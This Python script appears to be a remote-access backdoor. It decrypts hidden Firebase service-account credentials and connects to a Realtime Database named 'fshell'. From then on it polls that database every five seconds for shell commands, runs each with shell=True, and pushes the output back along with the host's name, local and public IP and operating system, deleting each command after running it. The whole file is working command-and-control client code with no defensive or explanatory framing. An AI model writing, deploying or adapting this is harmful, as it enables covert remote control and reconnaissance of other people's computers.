import firebase_admin
from firebase_admin import credentials, db
import subprocess
import time
from cryptography.fernet import Fernet
import platform
import socket
import requests
import json

# Load the encryption key
with open('.secret.key', 'rb') as key_file:
    key = key_file.read()
cipher = Fernet(key)

# Function to decrypt a file
def decrypt_file(file_path):
    with open(file_path, 'rb') as f:
        encrypted_data = f.read()
    decrypted_data = cipher.decrypt(encrypted_data)
    with open(file_path, 'wb') as f:
        f.write(decrypted_data)

# Function to encrypt a file
def encrypt_file(file_path):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    encrypted_data = cipher.encrypt(file_data)
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)

# Decrypt the f-shell.json file before initializing Firebase
decrypt_file('.f-shell.json')

# Verify the JSON content
try:
    with open('.f-shell.json', 'r') as json_file:
        json.load(json_file)  # Attempt to load the JSON to ensure it's valid
except Exception as e:
    raise RuntimeError(f"Decrypted .f-shell.json is not valid JSON: {e}")

# Initialize the Firebase app with the service account credentials
cred = credentials.Certificate('.f-shell.json')
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://fshell-default-rtdb.firebaseio.com/'
})

# Re-encrypt the f-shell.json file after initializing Firebase
encrypt_file('.f-shell.json')

# Function to execute a command and return output
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return output
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"

# Function to get system information
def get_system_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        public_ip = requests.get('https://api.ipify.org').text
        os_info = platform.platform()
        system_info = {
            'hostname': hostname,
            'local_ip': local_ip,
            'public_ip': public_ip,
            'os': os_info
        }
        return system_info
    except Exception as e:
        return {'error': str(e)}

# Function to check for new commands and execute them
def check_for_commands():
    ref = db.reference('shell/commands')
    commands = ref.get()
    if isinstance(commands, dict):
        system_info = get_system_info()
        for key, value in commands.items():
            command = value.get('command', '')  # This line assumes commands is a dictionary
            if command:
                output = execute_command(command)
                output_ref = db.reference('shell/output')
                output_ref.push().set({'output': output, 'system_info': system_info})
                ref.child(key).delete()

# Continuously check for commands
while True:
    check_for_commands()
    time.sleep(5)  # Increased sleep time to allow commands to execute and capture output
